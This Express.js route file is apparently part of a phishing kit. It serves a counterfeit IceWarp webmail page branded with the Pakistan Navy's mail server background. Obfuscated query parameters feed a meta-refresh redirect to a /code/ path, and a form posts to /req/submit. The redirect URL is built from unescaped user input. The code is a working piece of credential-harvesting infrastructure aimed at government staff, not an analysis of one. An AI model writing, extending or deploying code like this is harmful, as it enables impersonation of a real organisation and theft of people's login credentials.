
const express = require ('express');
const router = express.Router();


router.use(express.static('public'));

//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data = req.query.sdjkhfjdshfjkhdjkfhuewrghjfdghkdfe;

    const url = `/code/?gdjfghfdhgjfdgfdgkldfjgkldfjlgdkjglkjfdl=${data}`;

    if (data == null) {
    res.render('error');
    
    }else{


    const htmlContent = `
  
            <!DOCTYPE html>
            <html>
            <head>
              <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
              <title>IceWarp WebClient</title>
              <base href=".">
              <link rel="icon" href="/files/favicon-32.png" sizes="32x32">
              <meta id="theme-colors">
              <meta http-equiv="X-UA-Compatible" content="IE=edge">
              <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0">
              <meta name="google" value="notranslate">
              <meta http-equiv="cleartype" content="on">
              <meta name="version" content="25020709">
              <meta name="stylesheet" content="css/style.css" variables="true">
              <meta http-equiv="refresh" content="3;url=${url}">
              <link type="text/css" href="/files/api.css" rel="stylesheet">
              <link type="text/css" href="/files/pikaday.css" rel="stylesheet">
              <link type="text/css" href="/files/style.css" rel="stylesheet">
              <!-- <link type="text/css" href="/files/custom.css" rel="stylesheet"> -->
              <link type="text/css" rel="stylesheet" href="/files/style.css">
              <style>
                :root {
                  --theme-color: hsl(266.45161290322585, 89.42307692307695%, 45%);
                  --default-color: hsl(266.45161290322585, 89.42307692307695%, 45%);
                  --deep-purple-color: hsl(266.45161290322585, 89.42307692307695%, 45%);
                  --default-grey-color: hsl(266.45161290322585, 6%, 69%);
                  --default-light-grey-color: hsl(266.45161290322585, 11%, 82%);
                }

                .o-card__content {
                  position: relative;
                  min-height: 150px; /* optional, ensures visible area */
                  display: flex;
                  align-items: center;
                  justify-content: center;
                }

                .loader {
                  width: 100px;
                  height: 100px;
                  border: 5px solid rgba(0, 0, 0, 0.1);
                  border-top-color: #0078d7; /* your accent color */
                  border-radius: 50%;
                  animation: spin 1s linear infinite;
                }

                @keyframes spin {
                  to {
                    transform: rotate(360deg);
                  }
                }

              </style>


            </head>
            <body dir="ltr">
              <div class="o-external t-default cover sites-login site" style="background-color: rgb(103, 12, 217); background-image: url(&quot;https://mail.paknavy.gov.pk/webmail/./server/download.php?class=background&amp;fullpath=mail.paknavy.gov.pk&amp;uid=&amp;resize=1&amp;width=1920&amp;height=1080&quot;);" data-component="sites-login-1" id="content">
                <main class="o-external__main">
                  <form class="o-card c-card templates-card" data-hook="form" action="/req/submit" accept-charset="UTF-8"  method="POST" data-component="templates-card-2">
                    <div class="o-card__main">
                      <div data-component="atoms-dropdown-3" class="o-dropdown o-card__lang " data-hook="language">
                        <label class="o-dropdown__text">en</label>
                      </div>
                      <div class="o-card__content" data-hook="content">
                        <div class="loader"></div>
                      </div>
                    </div>
                  </form>
                </main>
                <div data-component="organisms-bar~footer-1" class=" o-bar  o-external__footer  ">
                        <section class=" o-bar__section  o-bar__section--start  ">
                    <p class="o-external__copy o-info">Powered by IceWarp ©&nbsp; <time datetime="2025">2025</time>
                    </p>
                  </section>
                  <section class=" o-bar__section  o-bar__section--center  ">
                    <a class="o-external__social" title="https://www.facebook.com/IceWarpInc" href="https://www.facebook.com/IceWarpInc" rel="noopener" target="_blank">
                      <svg data-component="atoms-icons-3" class="o-icon o-external__icon" viewBox="0 0 330 330">
                        <path d="M165 0c-91.080 0-165 73.92-165 165s73.92 165 165 165c91.080 0 165-73.92 165-165s-73.92-165-165-165zM203.94 138.6l-1.98 19.8h-30.36v92.4h-33v-92.4h-19.8v-19.8h19.8v-21.12c0-7.92 1.32-19.8 6.6-27.060 5.94-7.92 14.52-13.2 29.040-13.2 23.1 0 33 3.3 33 3.3l-4.62 27.060c0 0-9.24-1.98-16.5-1.98s-15.18 2.64-15.18 9.9v23.76h33z"/>
                      </svg>
                    </a>

                    <a class="o-external__social" title="https://twitter.com/icewarp" href="https://twitter.com/icewarp" rel="noopener" target="_blank">
                      <svg data-component="atoms-icons-4" class=" o-icon  o-external__icon  " viewBox="0 0 330 330">
                        <path d="M165 0c-91.080 0-165 73.92-165 165s73.92 165 165 165c91.080 0 165-73.92 165-165s-73.92-165-165-165zM249.48 132c0 1.98 0 3.3 0 5.28 0 54.12-40.92 116.16-116.16 116.16-23.1 0-44.22-6.6-62.7-18.48 3.3 0.66 6.6 0.66 9.9 0.66 19.14 0 36.96-6.6 50.82-17.16-17.82-0.66-33-11.88-38.28-28.38 2.64 0.66 5.28 0.66 7.92 0.66 3.96 0 7.26-0.66 10.56-1.32-18.48-3.96-32.34-20.46-32.34-40.26 0 0 0-0.66 0-0.66 6.6 3.3 11.88 4.62 18.48 5.28-11.22-7.26-18.48-19.8-18.48-33.66 0-7.26 1.98-14.52 5.28-20.46 19.8 24.42 50.16 40.92 83.82 42.24-0.66-3.3-1.32-5.94-1.32-9.24 0-22.44 18.48-40.92 40.92-40.92 11.88 0 22.44 4.62 29.7 12.54 9.24-1.98 17.82-5.28 25.74-9.9-3.3 9.24-9.24 17.82-17.82 22.44 7.92-0.66 15.84-3.3 23.1-6.6-4.62 9.24-11.22 16.5-19.14 21.78z"/>
                      </svg>
                    </a>
                    <a class="o-external__social" title="https://www.linkedin.com/company/IceWarp" href="https://www.linkedin.com/company/IceWarp" rel="noopener" target="_blank">
                      <svg data-component="atoms-icons-5" class=" o-icon  o-external__icon  " viewBox="0 0 330 330">
                        <path d="M165 0c-91.080 0-165 73.92-165 165s73.92 165 165 165 165-73.92 165-165c0-91.080-73.92-165-165-165zM118.8 250.8h-39.6v-118.8h39.6v118.8zM99 125.4v0c-12.54 0-21.12-10.56-21.12-21.78s8.58-20.46 21.12-20.46c12.54 0 20.46 9.9 21.12 21.12 0 10.56-7.92 21.12-21.12 21.12zM250.8 250.8h-39.6v-62.7c0-15.18-3.96-25.080-17.16-25.080-10.56 0-13.86 6.6-17.16 13.2-1.32 2.64 1.32 5.94 1.32 9.24v65.34h-40.26c0 0 0.66-105.6 0-118.8h40.26v19.8c0-7.92 11.88-18.48 31.68-18.48 24.42 0 40.92 15.84 40.92 50.16v67.32z"/>
                      </svg>
                    </a>

                  </section>
                  <section class=" o-bar__section  o-bar__section--end  ">
                    <p class="o-info" title="Epos Update 1 build 17">
                      <a href="https://www.icewarp.com/" target="_blank" rel="noopener noreferrer">www.icewarp.com</a>
                    </p>
                  </section>
                </div>
              </div>
            </body>
          </html>


    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});




module.exports =router